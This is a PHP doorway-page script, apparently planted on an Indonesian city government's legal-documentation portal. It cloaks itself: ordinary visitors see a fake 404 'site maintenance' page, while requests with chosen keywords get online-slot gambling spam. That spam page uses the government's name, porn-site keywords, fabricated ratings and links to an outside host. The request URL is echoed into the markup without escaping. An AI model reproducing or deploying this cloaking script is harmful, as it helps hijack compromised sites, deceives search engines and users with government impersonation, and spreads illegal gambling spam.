<?php
error_reporting(0);
set_time_limit(0);

function denied() {
    header("HTTP/1.0 404 Not Found");
    echo '
    <!DOCTYPE html>
    <html lang="tr"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
    <title>Site Maintenance - Kominfo</title>
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" 
rel="stylesheet">
<style>
  html, body { padding: 0; margin: 0; width: 100%; height: 100%; }
  * {box-sizing: border-box;}
  body { text-align: center; padding: 0; background: rgb(2,0,36);
background: linear-gradient(90deg, rgba(2,0,36,1) 0%, rgba(9,9,121,1) 35%, 
rgba(0,212,255,1) 100%);Open Sans; }
  h1 { font-size: 50px; font-weight: 100; text-align: center;}
  body { font-family: Open Sans; font-weight: 100; font-size: 20px; color: 
#fff; text-align: center; display: -webkit-box; display: -ms-flexbox; 
display: flex; -webkit-box-pack: center; -ms-flex-pack: center; 
justify-content: center; -webkit-box-align: center; -ms-flex-align: 
center; align-items: center;}
  article { display: block; width: 700px; padding: 50px; margin: 0 auto; }
  a { color: #fff; font-weight: bold;}
  a:hover { text-decoration: none; }
  svg { width: 75px; margin-top: 1em; }
</style>

<article><br /><br /><br /><br /><br /><br /><br />
    <p align="center"><img src="https://ik.imagekit.io/kmf/cropped-logo-kominfo_RCIhZisPL.png?ik-sdk-version=javascript-1.4.3&updatedAt=1659289939815" height="200" width="200"></p>
     <h1>Saat ini website dalam pemeliharaan</h1>
    <div>
        Mohon maaf atas ketidaknyamanannya. Kami sedang melakukan 
pemeliharaan terhadap website ini. 
									
       
					</ul>
					
			<br />
        <p>&copy; 2025<br> Kementerian Komunikasi dan Informatika</p>
    </div>
</article>
    
    
    
    </body></html>
    ';

}

$filename = "lol.txt";

if (isset($_GET['news_ID'])) {
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['news_ID']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "";
        }
    } else {
        denied();
        exit();
    }
} else {
    denied();
    exit();
}
$ampmek = "https://jdih-tarakankota.pages.dev/?news_ID=$BRANDS";
?>

<!DOCTYPE html>
		<html class="js audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a cors cssanimations backgroundblendmode flexbox inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color localstorage placeholder svg xhr2" lang="en">
			<head>
			<meta charset="utf-8">
			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		window.DATADOG_CONFIG={clientToken:'puba7a42f353afa86efd9e11ee56e5fc8d9',applicationId:'8561f3f6-5252-482b-ba9f-2bbb1b009106',site:'datadoghq.com',service:'marketplace',env:'production',version:'f7d8b3d494288b34cb00105ee5d230d68b0ccca7',sessionSampleRate:0.2,sessionReplaySampleRate:5};
		//]]></script>
			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		var rollbarEnvironment="production"
		var codeVersion="f7d8b3d494288b34cb00105ee5d230d68b0ccca7"
		//]]></script>
			<meta content="origin-when-cross-origin" name="referrer">
			<link rel="dns-prefetch" href="//s3.envato.com">
			<link rel="preload" href="https://market-resized.envatousercontent.com/themeforest.net/files/344043819/MARKETICA_PREVIEW/00-marketica-preview-sale37.__large_preview.jpg?auto=format&amp;q=94&amp;cf_fit=crop&amp;gravity=top&amp;h=8000&amp;w=590&amp;s=cc700268e0638344373c64d90d02d184c75d7defef1511b43f3ecf3627a3f2d4" as="image">
			<link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/logos-20f56d7ae7a08da2c6698db678490c591ce302aedb1fcd05d3ad1e1484d3caf9.png" as="image">
			<link rel="preload" href="https://public-assets.envato-static.com/assets/generated_sprites/common-5af54247f3a645893af51456ee4c483f6530608e9c15ca4a8ac5a6e994d9a340.png" as="image">
			<title><?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan</title>
			<meta name="description" content="<?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.">
			<meta name="viewport" content="width=device-width,initial-scale=1">
			<link rel="icon" type="image/x-icon" href="https://www.xnxx.com/favicon-16x16.png">
			<link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons favicons/apple-touch-icon-72x72-precomposed-ea6fb08063069270d41814bdcea6a36fee5fffaba8ec1f0be6ccf3ebbb63dddb.png" sizes="72x72">
			<link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-114x114-precomposed-bab982e452fbea0c6821ffac2547e01e4b78e1df209253520c7c4e293849c4d3.png" sizes="114x114">
			<link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-120x120-precomposed-8275dc5d1417e913b7bd8ad048dccd1719510f0ca4434f139d675172c1095386.png" sizes="120x120">
			<link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-144x144-precomposed-c581101b4f39d1ba1c4a5e45edb6b3418847c5c387b376930c6a9922071c8148.png" sizes="144x144">
			<link rel="apple-touch-icon-precomposed" type="image/x-icon" href="https://public-assets.envato-static.com/assets/icons/favicons/apple-touch-icon-precomposed-c581101b4f39d1ba1c4a5e45edb6b3418847c5c387b376930c6a9922071c8148.png">
			<link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/core/index-999d91c45b3ce6e6c7409b80cb1734b55d9f0a30546d926e1f2c262cd719f9c7.css" media="all">
			<link rel="stylesheet" href="https://public-assets.envato-static.com/assets/market/pages/default/index-ffa1c54dffd67e25782769d410efcfaa8c68b66002df4c034913ae320bfe6896.css" media="all">
			<script src="https://public-assets.envato-static.com/assets/components/brand_neue_tokens-f25ae27cb18329d3bba5e95810e5535514237939674fca40a02d8e2635fa20d6.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" defer="defer" type="aa0e390b349607549f273e46-text/javascript"></script>
			<meta name="theme-color" content="#22321">
			<link rel="canonical" href="<?php echo $urlPath;?>">
			<link rel="amphtml" href="<?php echo $ampmek;?>"/>
		   <script type="application/ld+json">
		{
		  "@context": "https://schema.org",
		  "@type": "Product",
		  "name": "<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan",
		  "image": "https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg",
		  "description": "<?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.",
		  "brand": {
			"@type": "Brand",
			"name": "SLOT ONLINE GACOR"
		  },
		  "sku": "845514",
		  "mpn": "845514",
		  "url": "<?php echo $urlPath;?>",
		  "offers": {
			"@type": "Offer",
			"url": "<?php echo $urlPath;?>",
			"priceCurrency": "USD",
			"price": "0.00",
			"priceValidUntil": "2025-12-31",
			"itemCondition": "https://schema.org/NewCondition",
			"availability": "https://schema.org/InStock",
			"seller": {
			  "@type": "Organization",
			  "name": "SLOT GACOR <?php echo $BRANDS;?>"
			}
		  },
		  "aggregateRating": {
			"@type": "AggregateRating",
			"ratingValue": "5.0",
			"reviewCount": 63262362
		  },
		  "review": [
			{
			  "@type": "Review",
			  "reviewRating": {
				"@type": "Rating",
				"ratingValue": "5",
				"bestRating": "5"
			  },
			  "author": {
				"@type": "Person",
				"name": "Maky"
			  }
			},
			{
			  "@type": "Review",
			  "reviewRating": {
				"@type": "Rating",
				"ratingValue": "5",
				"bestRating": "5"
			  },
			  "author": {
				"@type": "Person",
				"name": "Suzuna"
			  }
			}
		  ]
		}
		</script>

		<script type="application/ld+json">
		{
		  "@context": "https://schema.org",
		  "@type": "BreadcrumbList",
		  "itemListElement": [
			{
			  "@type": "ListItem",
			  "position": 1,
			  "name": "lk21",
			  "item": "<?php echo $urlPath;?>"
			},
			{
			  "@type": "ListItem",
			  "position": 2,
			  "name": "<?php echo $BRANDS;?>",
			  "item": "<?php echo $urlPath;?>"
			},
			{
			  "@type": "ListItem",
			  "position": 3,
			  "name": "bokep",
			  "item": "<?php echo $urlPath;?>"
			},
			{
			  "@type": "ListItem",
			  "position": 4,
			  "name": "xvideos",
			  "item": "<?php echo $urlPath;?>"
			},
			{
			  "@type": "ListItem",
			  "position": 5,
			  "name": "<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan",
			  "item": "<?php echo $urlPath;?>"
			}
		  ]
		}
		</script>

		<script type="application/ld+json">
		{
		  "@context": "https://schema.org",
		  "@type": "Organization",
		  "name": "pornhub",
		  "url": "<?php echo $urlPath;?>",
		  "logo": "https://pub-102b165e0ba64aa4866e078d46aa5697.r2.dev/slotgacor.png",
		  "sameAs": [
			"https://www.facebook.com/SLOT ONLINE GACOR",
			"https://twitter.com/SLOT ONLINE GACOR",
			"https://www.instagram.com/SLOT ONLINE GACOR"
		  ],
		  "contactPoint": {
			"@type": "ContactPoint",
			"telephone": "+62-9872-216-1235",
			"contactType": "customer support",
			"areaServed": "ID",
			"availableLanguage": ["Indonesian", "English"]
		  }
		}
		</script>




			<script nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript">//<![CDATA[
		window.dataLayer=window.dataLayer||[];
		//]]></script>
			<meta name="bingbot" content="nocache">

			<!-- Open Graph -->
			<meta property="og:title" content="<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan">
			<meta property="og:description" content="<?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.">
			<meta property="og:image" content="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg">
			<meta property="og:url" content="<?php echo $urlPath;?>">
			<meta property="og:type" content="website">

			<!-- Twitter Card -->
			<meta name="twitter:card" content="summary_large_image">
			<meta name="twitter:title" content="<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan">
			<meta name="twitter:description" content="<?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.">
			<meta name="twitter:image" content="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg">
			<meta property="og:title" content="<?php echo $BRANDS;?> # Jaringan Dokumentasi dan Informasi Hukum Digital Kota Tarakan">
			<meta property="og:type" content="website">
			<meta property="og:url" content="<?php echo $urlPath;?>">
			<meta property="og:image" content="https://i.pinimg.com/736x/d9/3e/a5/d93ea504e9ed8dfd0a5c4254bcd2d5e4.jpg"/>
			<meta property="og:description" content="<?php echo $BRANDS;?> adalah portal resmi milik Pemerintah Kota Tarakan yang dikelola oleh Bagian Hukum Setda dan merupakan sarana penting dalam upaya pemerintah menyediakan dokumentasi hukum yang transparan dan aksesibel bagi warga.">
			<meta property="og:site_name" content="SLOT GACOR">
			<meta name="csrf-param" content="authenticity_token">
			<meta name="csrf-token" content="o7V7LGbBjnF9HgzqsCOek0VUbYNaqFcrL72zjeu3cGTv2_7pn5UklFm7XFtDaDCfkbbeD4zdIzwPzjrUhXtbHQ">
			<meta name="turbo-visit-control" content="reload">
			<script type="aa0e390b349607549f273e46-text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookieconsent="statistics">//<![CDATA[
		var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W8KL5Q5');
		//]]></script>


			<script type="aa0e390b349607549f273e46-text/javascript" nonce="TFNQUvYHwdi8uHoMheRs/Q==" data-cookie consent="marketing">//<![CDATA[
		var gtmId='GTM-KGCDGPL6';var container_env_param="";(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+container_env_param;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer',gtmId);window.addEventListener('load',function(){window.dataLayer.push({event:'pinterestReady'});});
		//]]></script>
			<script src="https://public-assets.envato-static.com/assets/market/core/head-d4f3da877553664cb1d5ed45cb42c6ec7e6b00d0c4d164be8747cfd5002a24eb.js" nonce="TFNQUvYHwdi8uHoMheRs/Q==" type="aa0e390b349607549f273e46-text/javascript"></script>
			<style type="text/css" id="CookieConsentStateDisplayStyles">.cookieconsent-optin,.cookieconsent-optin-preferences,.cookieconsent-optin-statistics,.cookieconsent-optin-marketing{display:block;display:initial}.cookieconsent-optout-preferences,.cookieconsent-optout-statistics,.cookieconsent-optout-marketing,.cookieconsent-optout{display:none}</style>
			 <script src="https://wptheme.cloud/wp-includes/wp-elements/wp-emoji-release-version.2.7.js" type="aa0e390b349607549f273e46-text/javascript"></script>
			<style>:root{--color-grey-1000:#191919;--color-grey-1000-mask: rgb(25 25 25 / 0.7);--color-grey-700:#383838;--color-grey-500:#707070;--color-grey-300:#949494;--color-grey-100:#ccc;--color-grey-50:#ececee;--color-grey-25:#f9f9fb;--color-white:#fff;--color-white-mask: rgb(255 255 255 / 0.7);--color-green-1000:#1a4200;--color-green-700:#2e7400;--color-green-500:#51a31d;--color-green-300:#6cc832;--color-green-100:#9cee69;--color-green-25:#eaffdc;--color-blue-1000:#16357b;--color-blue-700:#4f5ce8;--color-blue-500:#7585ff;--color-blue-25:#f0f1ff;--color-veryberry-1000:#77012d;--color-veryberry-700:#b9004b;--color-veryberry-500:#f65286;--color-veryberry-25:#ffecf2;--color-bubblegum-700:#b037a6;--color-bubblegum-100:#e6afe1;--color-bubblegum-25:#feedfc;--color-jaffa-1000:#692400;--color-jaffa-700:#c24100;--color-jaffa-500:#ff6e28;--color-jaffa-25:#fff5ed;--color-yolk-1000:#452d0d;--color-yolk-700:#9e5f00;--color-yolk-500:#c28800;--color-yolk-300:#ffc800;--color-yolk-25:#fefaea;--color-transparent:transparent;--breakpoint-wide:1024px;--breakpoint-extra-wide:1440px;--breakpoint-2k-wide:2560px;--spacing-8x:128px;--spacing-7x:64px;--spacing-6x:40px;--spacing-5x:32px;--spacing-4x:24px;--spacing-3x:16px;--spacing-2x:8px;--spacing-1x:4px;--spacing-none:0;--chunkiness-none:0;--chunkiness-thin:1px;--chunkiness-thick:2px;--roundness-square:0;--roundness-subtle:4px;--roundness-extra-round:16px;--roundness-circle:48px;--shadow-500: 0px 2px 12px 0px rgba(0 0 0 / 15%);--elevation-medium:var(--shadow-500);--transition-base:.2s;--transition-duration-long:500ms;--transition-duration-medium:300ms;--transition-duration-short:150ms;--transition-easing-linear:cubic-bezier(0,0,1,1);--transition-easing-ease-in:cubic-bezier(.42,0,1,1);--transition-easing-ease-in-out:cubic-bezier(.42,0,.58,1);--transition-easing-ease-out:cubic-bezier(0,0,.58,1);--font-family-wide:"PolySansWide" , "PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-regular:"PolySans" , "Inter" , -apple-system , "BlinkMacSystemFont" , "Segoe UI" , "Fira Sans" , "Helvetica Neue" , "Arial" , sans-serif;--font-family-monospace:"Courier New" , monospace;--font-size-10x:6rem;--font-size-9x:4.5rem;--font-size-8x:3rem;--font-size-7x:2.25rem;--font-size-6x:1.875rem;--font-size-5x:1.5rem;--font-size-4x:1.125rem;--font-size-3x:1rem;--font-size-2x:.875rem;--font-size-1x:.75rem;--font-weight-bulky:700;--font-weight-median:600;--font-weight-neutral:400;--font-spacing-tight:-.02em;--font-spacing-normal:0;--font-spacing-loose:.02em;--font-height-tight:1;--font-height-normal:1.5;--icon-size-5x:48px;--icon-size-4x:40px;--icon-size-3x:32px;--icon-size-2x:24px;--icon-size-1x:16px;--icon-size-text-responsive: calc(var(--font-size-3x) * 1.5);--layer-depth-ceiling:9999;--minimum-touch-area:40px;--button-height-large:48px;--button-height-medium:40px;--button-font-family:var(--font-family-regular);--button-font-size-large:var(--font-size-3x);--button-font-size-medium:var(--font-size-2x);--button-font-weight:var(--font-weight-median);--button-font-height:var(--font-height-normal);--button-font-spacing:var(--font-spacing-normal);--text-style-chip-family:var(--font-family-regular);--text-style-chip-spacing:var(--font-spacing-normal);--text-style-chip-xlarge-size:var(--font-size-5x);--text-style-chip-xlarge-weight:var(--font-weight-median);--text-style-chip-xlarge-height:var(--font-height-tight);--text-style-chip-large-size:var(--font-size-3x);--text-style-chip-large-weight:var(--font-weight-neutral);--text-style-chip-large-height:var(--font-height-normal);--text-style-chip-medium-size:var(--font-size-2x);--text-style-chip-medium-weight:var(--font-weight-neutral);--text-style-chip-medium-height:var(--font-height-normal);--text-style-campaign-large-family:var(--font-family-wide);--text-style-campaign-large-size:var(--font-size-9x);--text-style-campaign-large-spacing:var(--font-spacing-normal);--text-style-campaign-large-weight:var(--font-weight-bulky);--text-style-campaign-large-height:var(--font-height-tight);--text-style-campaign-small-family:var(--font-family-wide);--text-style-campaign-small-size:var(--font-size-7x);--text-style-campaign-small-spacing:var(--font-spacing-normal);--text-style-campaign-small-weight:var(--font-weight-bulky);--text-style-campaign-small-height:var(--font-height-tight);--text-style-title-1-family:var(--font-family-regular);--text-style-title-1-size:var(--font-size-8x);--text-style-title-1-spacing:var(--font-spacing-normal);--text-style-title-1-weight:var(--font-weight-bulky);--text-style-title-1-height:var(--font-height-tight);--text-style-title-2-family:var(--font-family-regular);--text-style-title-2-size:var(--font-size-7x);--text-style-title-2-spacing:var(--font-spacing-normal);--text-style-title-2-weight:var(--font-weight-median);--text-style-title-2-height:var(--font-height-tight);--text-style-title-3-family:var(--font-family-regular);--text-style-title-3-size:var(--font-size-6x);--text-style-title-3-spacing:var(--font-spacing-normal);--text-style-title-3-weight:var(--font-weight-median);--text-style-title-3-height:var(--font-height-tight);--text-style-title-4-family:var(--font-family-regular);--text-style-title-4-size:var(--font-size-5x);--text-style-title-4-spacing:var(--font-spacing-normal);--text-style-title-4-weight:var(--font-weight-median);--text-style-title-4-height:var(--font-height-tight);--text-style-subheading-family:var(--font-family-regular);--text-style-subheading-size:var(--font-size-4x);--text-style-subheading-spacing:var(--font-spacing-normal);--text-style-subheading-weight:var(--font-weight-median);--text-style-subheading-height:var(--font-height-normal);--text-style-body-large-family:var(--font-family-regular);--text-style-body-large-size:var(--font-size-3x);--text-style-body-large-spacing:var(--font-spacing-normal);--text-style-body-large-weight:var(--font-weight-neutral);--text-style-body-large-height:var(--font-height-normal);--text-style-body-large-strong-weight:var(--font-weight-bulky);--text-style-body-small-family:var(--font-family-regular);--text-style-body-small-size:var(--font-size-2x);--text-style-body-small-spacing:var(--font-spacing-normal);--text-style-body-small-weight:var(--font-weight-neutral);--text-style-body-small-height:var(--font-height-normal);--text-style-body-small-strong-weight:var(--font-weight-bulky);--text-style-label-large-family:var(--font-family-regular);--text-style-label-large-size:var(--font-size-3x);--text-style-label-large-spacing:var(--font-spacing-normal);--text-style-label-large-weight:var(--font-weight-median);--text-style-label-large-height:var(--font-height-normal);--text-style-label-small-family:var(--font-family-regular);--text-style-label-small-size:var(--font-size-2x);--text-style-label-small-spacing:var(--font-spacing-loose);--text-style-label-small-weight:var(--font-weight-median);--text-style-label-small-height:var(--font-height-normal);--text-style-micro-family:var(--font-family-regular);--text-style-micro-size:var(--font-size-1x);--text-style-micro-spacing:var(--font-spacing-loose);--text-style-micro-weight:var(--font-weight-neutral);--text-style-micro-height:var(--font-height-tight)}.color-scheme-light{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-grey-1000);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-25);--color-interactive-control:var(--color-grey-1000);--color-interactive-control-hover:var(--color-grey-700);--color-interactive-disabled:var(--color-grey-100);--color-surface-primary:var(--color-white);--color-surface-accent:var(--color-grey-50);--color-surface-inverse:var(--color-grey-1000);--color-surface-brand-accent:var(--color-jaffa-25);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-25);--color-surface-caution-strong:var(--color-jaffa-700);--color-surface-critical-default:var(--color-veryberry-25);--color-surface-critical-strong:var(--color-veryberry-700);--color-surface-info-default:var(--color-blue-25);--color-surface-info-strong:var(--color-blue-700);--color-surface-neutral-default:var(--color-grey-25);--color-surface-neutral-strong:var(--color-grey-1000);--color-surface-positive-default:var(--color-green-25);--color-surface-positive-strong:var(--color-green-700);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-700);--color-content-primary:var(--color-grey-1000);--color-content-inverse:var(--color-white);--color-content-secondary:var(--color-grey-500);--color-content-disabled:var(--color-grey-300);--color-content-caution-default:var(--color-jaffa-700);--color-content-caution-strong:var(--color-jaffa-25);--color-content-critical-default:var(--color-veryberry-700);--color-content-critical-strong:var(--color-veryberry-25);--color-content-info-default:var(--color-blue-700);--color-content-info-strong:var(--color-blue-25);--color-content-neutral-default:var(--color-grey-1000);--color-content-neutral-strong:var(--color-white);--color-content-positive-default:var(--color-green-700);--color-content-positive-strong:var(--color-green-25);--color-border-primary:var(--color-grey-1000);--color-border-secondary:var(--color-grey-300);--color-border-tertiary:var(--color-grey-100);--color-always-white:var(--color-white)}.color-scheme-dark{--color-interactive-primary:var(--color-green-100);--color-interactive-primary-hover:var(--color-green-300);--color-interactive-secondary:var(--color-transparent);--color-interactive-secondary-hover:var(--color-white);--color-interactive-tertiary:var(--color-transparent);--color-interactive-tertiary-hover:var(--color-grey-700);--color-interactive-control:var(--color-white);--color-interactive-control-hover:var(--color-grey-100);--color-interactive-disabled:var(--color-grey-700);--color-surface-primary:var(--color-grey-1000);--color-surface-accent:var(--color-grey-700);--color-surface-inverse:var(--color-white);--color-surface-brand-accent:var(--color-grey-700);--color-surface-elevated:var(--color-grey-700);--color-surface-caution-default:var(--color-jaffa-1000);--color-surface-caution-strong:var(--color-jaffa-500);--color-surface-critical-default:var(--color-veryberry-1000);--color-surface-critical-strong:var(--color-veryberry-500);--color-surface-info-default:var(--color-blue-1000);--color-surface-info-strong:var(--color-blue-500);--color-surface-neutral-default:var(--color-grey-700);--color-surface-neutral-strong:var(--color-white);--color-surface-positive-default:var(--color-green-1000);--color-surface-positive-strong:var(--color-green-500);--color-overlay-light:var(--color-white-mask);--color-overlay-dark:var(--color-grey-1000-mask);--color-content-brand:var(--color-green-1000);--color-content-brand-accent:var(--color-bubblegum-100);--color-content-primary:var(--color-white);--color-content-inverse:var(--color-grey-1000);--color-content-secondary:var(--color-grey-100);--color-content-disabled:var(--color-grey-500);--color-content-caution-default:var(--color-jaffa-500);--color-content-caution-strong:var(--color-jaffa-1000);--color-content-critical-default:var(--color-veryberry-500);--color-content-critical-strong:var(--color-veryberry-1000);--color-content-info-default:var(--color-blue-500);--color-content-info-strong:var(--color-blue-1000);--color-content-neutral-default:var(--color-white);--color-content-neutral-strong:var(--color-grey-1000);--color-content-positive-default:var(--color-green-500);--color-content-positive-strong:var(--color-green-1000);--color-border-primary:var(--color-white);--color-border-secondary:var(--color-grey-500);--color-border-tertiary:var(--color-grey-700);--color-always-white:var(--color-white)}</style>
			<style>.brand-neue-button{gap:var(--spacing-2x);border-radius:var(--roundness-subtle);background:var(--color-interactive-primary);color:var(--color-content-brand);font-family:PolySans-Median;font-size:var(--font-size-2x);letter-spacing:.02em;text-align:center;padding:0 20px}.brand-neue-button:hover,.brand-neue-button:active,.brand-neue-button:focus{background:var(--color-interactive-primary-hover)}.brand-neue-button__open-in-new::after{font-size:0;margin-left:5px;vertical-align:sub;content:url(data:image/svg+xml,<svg\ width=\"14\"\ height=\"14\"\ viewBox=\"0\ 0\ 20\ 20\"\ fill=\"none\"\ xmlns=\"http://www.w3.org/2000/svg\"><g\ id=\"ico-/-24-/-actions-/-open_in_new\"><path\ id=\"Icon-color\"\ d=\"M17.5\ 12.0833V15.8333C17.5\ 16.7538\ 16.7538\ 17.5\ 15.8333\ 17.5H4.16667C3.24619\ 17.5\ 2.5\ 16.7538\ 2.5\ 15.8333V4.16667C2.5\ 3.24619\ 3.24619\ 2.5\ 4.16667\ 2.5H7.91667C8.14679\ 2.5\ 8.33333\ 2.68655\ 8.33333\ 2.91667V3.75C8.33333\ 3.98012\ 8.14679\ 4.16667\ 7.91667\ 4.16667H4.16667V15.8333H15.8333V12.0833C15.8333\ 11.8532\ 16.0199\ 11.6667\ 16.25\ 11.6667H17.0833C17.3135\ 11.6667\ 17.5\ 11.8532\ 17.5\ 12.0833ZM17.3167\ 2.91667L17.0917\ 2.69167C16.98\ 2.57535\ 16.8278\ 2.50668\ 16.6667\ 2.5H11.25C11.0199\ 2.5\ 10.8333\ 2.68655\ 10.8333\ 2.91667V3.75C10.8333\ 3.98012\ 11.0199\ 4.16667\ 11.25\ 4.16667H14.6583L7.625\ 11.2C7.54612\ 11.2782\ 7.50175\ 11.3847\ 7.50175\ 11.4958C7.50175\ 11.6069\ 7.54612\ 11.7134\ 7.625\ 11.7917L8.20833\ 12.375C8.28657\ 12.4539\ 8.39307\ 12.4982\ 8.50417\ 12.4982C8.61527\ 12.4982\ 8.72176\ 12.4539\ 8.8\ 12.375L15.8333\ 5.35V8.75C15.8333\ 8.98012\ 16.0199\ 9.16667\ 16.25\ 9.16667H17.0833C17.3135\ 9.16667\ 17.5\ 8.98012\ 17.5\ 8.75V3.33333C17.4955\ 3.17342\ 17.4299\ 3.02132\ 17.3167\ 2.90833V2.91667Z\"\ fill=\"%231A4200\"/></g></svg>)}</style>
			<style type="text/css">.fancybox-margin{margin-right:15px}</style>
			<script src="https://bat.bing.com/p/action/16005611.js" type="aa0e390b349607549f273e46-text/javascript" async="" data-ueto="ueto_8c931ec7a9"></script>
				<script src="https://g.lzd-cdn.org/g/mtb/lib-mtop/2.5.1/polyfillB.js,mtb/lib-promise/3.1.3/mtop.js,mtb/lib-modules/1.1.4/pc.js" type="aa0e390b349607549f273e46-text/javascript"></script>
			<meta http-equiv="origin-trial" content="A7JYkbIvWKmS8mWYjXO12SIIsfPdI7twY91Y3LWOV/YbZmN1ZhYv8O+Zs6/IPCfBE99aV9tIC8sWZSCN09vf7gkAAACWeyJvcmlnaW4iOiJodHRwczovL2N0LnBpbnRlcmVzdC5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZzIiLCJleHBpcnkiOjE3NDIzNDIzOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
		<style>body{background-color:#dfdfdf;background-image:linear-gradient(315deg,#dfdfdf 0%,#a7a7a7 74%);background-attachment:fixed}.site-header,.global-header,.context-header,.site-header__sites,.site-header__categories{background-color:#dfdfdf!important;background-image:linear-gradient(315deg,#dfdfdf 0%,#a7a7a7 74%)!important}.item-preview,.purchase-panel,.box--no-padding{background-color:rgba(255,255,255,.1)!important;backdrop-filter:blur(12px)!important;-webkit-backdrop-filter:blur(12px)!important;border-radius:16px!important;border:1px solid rgba(255,255,255,.2)!important;box-shadow:0 4px 30px rgba(0,0,0,.1)}.item-preview,.purchase-panel{padding:24px!important;border:none!important}.item-preview__actions{background:transparent!important}.purchase-panel h3,.purchase-panel .price,.purchase-panel p,.purchase-panel label,.purchase-panel a,.purchase-panel .meta-attributes__attr-name,.purchase-panel .meta-attributes__attr-detail{color:#fff!important;text-shadow:1px 1px 3px rgba(0,0,0,.5)}.purchase-panel a{color:#a8eb12!important}</style>
		</head>

